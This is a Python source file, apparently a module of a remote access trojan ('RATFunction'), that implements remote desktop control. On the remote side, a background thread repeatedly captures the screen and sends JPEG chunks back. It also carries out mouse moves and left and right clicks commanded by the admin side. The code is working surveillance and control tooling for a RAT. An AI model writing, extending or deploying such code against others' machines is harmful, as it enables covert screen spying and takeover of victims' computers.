import io
import queue
import struct
import threading
import time
from PIL import ImageGrab
import pyautogui

from RATFunction.RATFunction import RATFunction, Side
from Constants import PACKET_SIZE


class RemoteDesktop(RATFunction):
    # packet_id | size | is_last | buffer
    image_chunk_packet_struct = struct.Struct(f"I I I {PACKET_SIZE - 4 - 4 - 4}s")

    # packet_id | 1 | enabled | _
    set_state_packet_struct = struct.Struct(f"I I I {PACKET_SIZE - 4 * 3}s")

    # packet_id | 2 | event_type | x | y | extra
    # packet_id | 2 | event_type | is_special | _ | key_str
    remote_control_event_packet_struct = struct.Struct(f"I I I I I {PACKET_SIZE - 4 * 5}s")

    def __init__(self, side, packet_queue):
        super().__init__(side, packet_queue)

        # remote vars
        self.remote_desktop_condition = threading.Condition()
        self.enabled = False

        if side == Side.REMOTE_SIDE:
            threading.Thread(target=self._remote_desktop_worker, daemon=True).start()

        # admin vars
        self.image_build_queue = queue.Queue()
        self.received_image_callback = lambda image_bytes: ()

    def handle_packet_admin_side(self, data):
        packet_id, size, last_flag, buffer = self.image_chunk_packet_struct.unpack(data)
        self.image_build_queue.put(buffer[:size])

        if last_flag:
            image_bytes = self.build_image()
            self.received_image_callback(image_bytes)

    def build_image(self):
        image_bytes = b''
        queue_size = self.image_build_queue.qsize()
        for i in range(queue_size):
            image_bytes += self.image_build_queue.get()

        return image_bytes

    def handle_packet_remote_side(self, data):
        packet_id, packet_subtype, _ = struct.unpack(f"I I {PACKET_SIZE - 8}s", data)

        if packet_subtype == 1:
            self.handle_packet_remote_set_state(data)
        elif packet_subtype == 2:
            self.handle_packet_remote_event(data)

    def handle_packet_remote_set_state(self, data):
        packet_id, packet_subtype, enabled, _ = self.set_state_packet_struct.unpack(data)
        if enabled != 0:
            self.enabled = True
            with self.remote_desktop_condition:
                self.remote_desktop_condition.notify()
        else:
            self.enabled = False

    def handle_packet_remote_event(self, data):
        _, _, event_type, x, y, extra_bytes = self.remote_control_event_packet_struct.unpack(data)

        if event_type == 1:
            pyautogui.moveTo(x, y, duration=0.1)
            pyautogui.click(x, y)
            # left click
        elif event_type == 2:
            pyautogui.moveTo(x, y, duration=0.1)
            pyautogui.rightClick(x, y)
            # right click
        elif event_type == 3:
            pyautogui.moveTo(x, y, duration=0.1)

    def send_left_click(self, x, y):
        packet = self.remote_control_event_packet_struct.pack(self.identifier(), 2, 1, x, y, bytes())
        self.packet_queue.put(packet)

    def send_right_click(self, x, y):
        packet = self.remote_control_event_packet_struct.pack(self.identifier(), 2, 2, x, y, bytes())
        self.packet_queue.put(packet)

    def send_set_state(self, state: bool):
        packet = self.set_state_packet_struct.pack(self.identifier(), 1, 1 if state else 0, bytes())
        self.packet_queue.put(packet)

    def _remote_desktop_worker(self):
        while True:
            while not self.enabled:
                with self.remote_desktop_condition:
                    self.remote_desktop_condition.wait()  # wait for the flag to be set to True

            # Capture screenshot image
            image = ImageGrab.grab()

            # Convert image to binary format
            with io.BytesIO() as output:
                image.save(output, format='JPEG', quality=80)
                binary_data = output.getvalue()

            offset = 0
            max_chunk_size = PACKET_SIZE - 12
            while offset < len(binary_data):
                chunk = binary_data[offset:offset + max_chunk_size]
                is_last = 1 if len(chunk) < max_chunk_size else 0

                packet = self.image_chunk_packet_struct.pack(self.identifier(), len(chunk), is_last, chunk)
                self.packet_queue.put(packet)

                offset += len(chunk)

            time.sleep(0.1)

    def identifier(self) -> int:
        return 2
